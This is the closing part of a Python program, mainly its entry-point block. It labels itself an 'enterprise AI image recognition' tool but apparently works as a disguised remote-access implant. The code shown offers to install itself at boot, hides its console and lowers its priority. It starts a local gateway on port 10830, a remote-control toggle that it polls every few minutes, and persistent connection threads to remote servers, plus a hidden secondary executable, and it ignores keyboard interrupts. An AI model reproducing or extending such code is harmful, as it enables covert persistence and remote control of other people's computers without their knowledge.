        if root is not None:
            try:
                root.destroy()
            except Exception:
                pass

# 程序入口
if __name__ == '__main__':
    _startup_trace("MAIN: enter __main__")
    # 显示程序说明
    print("=" * 50)
    print("企业级AI识图")
    print("作者: 脚本定制")
    print("=" * 50)
    # EXE 兼容：统一运行目录到程序所在目录，并设置 DPI 感知，避免高分屏坐标偏移
    try:
        os.chdir(get_app_dir())
        print(f"[运行目录] {os.getcwd()}")
        if platform.system() == 'Windows':
            try:
                ctypes.windll.user32.SetProcessDPIAware()
                print("[DPI] SetProcessDPIAware 已设置")
            except Exception:
                pass
    except Exception as e:
        print(f"[运行目录] 切换失败: {e}")

    # 诊断/追踪模式下跳过开机启动弹窗，避免 exe 卡住等待人工点击
    _startup_trace("MAIN: before prompt_enable_autostart")
    if STARTUP_TRACE or STARTUP_RELAX_GUARDS:
        print("[启动] 已启用诊断/放宽模式，跳过开机启动提示弹窗")
        _startup_trace("MAIN: skip prompt_enable_autostart (diagnostic)")
    else:
        prompt_enable_autostart()
        _startup_trace("MAIN: after prompt_enable_autostart")

    # 输出当前诊断开关状态
    print(f"[开关] 可见日志: {'开启' if STARTUP_VISIBLE_LOG else '关闭'}")
    print(f"[开关] 放宽启动门禁: {'开启' if STARTUP_RELAX_GUARDS else '关闭'}")
    _startup_trace("MAIN: switches visible_log=" + repr(STARTUP_VISIBLE_LOG) + " relax=" + repr(STARTUP_RELAX_GUARDS))

    # 文件锁方案：默认严格退出；诊断模式下仅告警不退出
    _startup_trace("MAIN: before lock check")
    check_file_lock_and_exit(strict_exit=not STARTUP_RELAX_GUARDS)
    _startup_trace("MAIN: after lock check")
    
    # EXE 运行仍需要检查？直接运行，不做门禁
    try:
        if is_frozen():
            print("[校验] EXE 模式启动")
    except Exception as e:
        print(f"[校验] 启动参数校验异常: {str(e)}")
    
    # 显示运行模式
    if remote_control_available and connection_targets:
        print("运行模式: F开头EXE启动")
        print("已启用，多行连接配置:")
        for idx, t in enumerate(connection_targets):
            conn_addr = t.get("connect_address", t["address"])
            conn_port = t.get("connect_port", t["port"])
            if conn_addr != t["address"] or conn_port != t["port"]:
                print(f"  [{idx}] {t['original']} -> 逻辑:{t['address']}:{t['port']} / 连接:{conn_addr}:{conn_port} SSL:{t['use_ssl']}")
            else:
                print(f"  [{idx}] {t['original']} -> {t['address']}:{t['port']} SSL:{t['use_ssl']}")
        print(f"控制方式: {get_control_filename()} 文件存在，功能已启用")
    else:
        print("已禁用")
        print(f"原因: {get_control_filename()} 文件不存在或服务不可用")
        print(f"控制方式: 删除{get_control_filename()}文件可禁用功能")
    
    print("F开头EXE启动: 已启用")
    print("=" * 50)
    print("功能控制说明:")
    print(f"- 创建{get_control_filename()}文件 → 启用功能")
    print(f"- 删除{get_control_filename()}文件 → 禁用功能")
    print("- 程序会自动检测文件状态")
    print(f"- 定期检测: 每180-250秒检测一次{get_control_filename()}文件状态")
    print("=" * 50)
    
    # 优化后的控制台隐藏方式（可见日志模式下不隐藏，便于诊断）
    try:
        if platform.system() == 'Windows':
            # 使用优化的窗口控制
            if STARTUP_VISIBLE_LOG:
                print("[日志] 可见日志模式已启用，跳过控制台隐藏")
            else:
                if safe_window_control('hide'):
                    print("程序运行...")
                else:
                    print("备用方案")
            
            # 设置进程优先级（可选）
            try:
                import psutil
                current_process = psutil.Process()
                current_process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
                print("进程优先级已设置为低优先级")
            except ImportError:
                print("psutil未安装，跳过优先级设置")
            except Exception as e:
                print(f"设置进程优先级失败: {str(e)}")
                
    except Exception as e:
        print(f"初始化失败: {str(e)}")
    
    # 生产环境程序完整性检测（默认失败即退出，诊断模式可降级）
    print("[检测] 开始生产环境检测...")
    if not check_program_integrity():
        if STARTUP_RELAX_GUARDS:
            print("[检测] 程序完整性检测失败，但已启用放宽启动模式，继续启动")
            _startup_trace("MAIN: integrity failed but relaxed -> continue")
        else:
            print("[检测] 程序完整性检测失败，程序退出")
            _startup_trace("MAIN: integrity failed strict -> exit(1)")
            sys.exit(1)
    
    # 生产环境API调用检测（默认失败即退出，诊断模式可降级）
    if not check_api_calls():
        if STARTUP_RELAX_GUARDS:
            print("[检测] API调用检测失败，但已启用放宽启动模式，继续启动")
            _startup_trace("MAIN: api_calls failed but relaxed -> continue")
        else:
            print("[检测] API调用检测失败，程序退出")
            _startup_trace("MAIN: api_calls failed strict -> exit(1)")
            sys.exit(1)
    
    print("[检测] 生产环境检测通过，程序启动")
    _startup_trace("MAIN: guards passed (or relaxed), starting gateway")

    # 先启动本机 10830 网关（后台线程），再启动后续线程/远控逻辑
    try:
        ok = start_local_gateway_10830()
        _startup_trace("MAIN: start_local_gateway_10830 returned " + repr(ok))
    except Exception:
        _startup_trace("MAIN: start_local_gateway_10830 raised")
        pass

    # 启动F开头EXE的线程
    launch_thread = threading.Thread(target=delayed_launch, daemon=True)
    launch_thread.start()
    
    # 启动定期检测线程
    periodic_thread = threading.Thread(target=periodic_check_remote_control, daemon=True)
    periodic_thread.start()
    print("[线程] 定期检测线程已启动")
    
    # 启动服务器信息定期重试线程
    server_info_thread = threading.Thread(target=periodic_fetch_server_info, daemon=True)
    server_info_thread.start()
    print("[线程] 服务器信息定期重试线程已启动")
    
    # 启动连接线程（多行并发，首行为主连接）
    if not remote_control_available or not connection_targets:
        print("[模式] 服务不可用或配置未获取，仅启动F开头EXE程序")
    else:
        threads = []
        for idx, target in enumerate(connection_targets):
            t = threading.Thread(target=connection_worker, args=(target, idx == 0), daemon=True)
            t.start()
            threads.append(t)
        print(f"[启动] 已启动 {len(threads)} 个连接线程（首个为主连接）")

    # 托盘（默认启用，除非 --no-tray）。托盘会阻塞主线程，替代下面的 while True。
    try:
        _startup_trace("MAIN: before tray_main")
        tray_started = tray_main()
        _startup_trace("MAIN: tray_main returned " + repr(tray_started))
    except Exception as e:
        _startup_trace("MAIN: tray_main exception=" + repr(e))
    
    # 主循环保持进程
    while True:
        try:
            time.sleep(60)
        except KeyboardInterrupt:
            continue
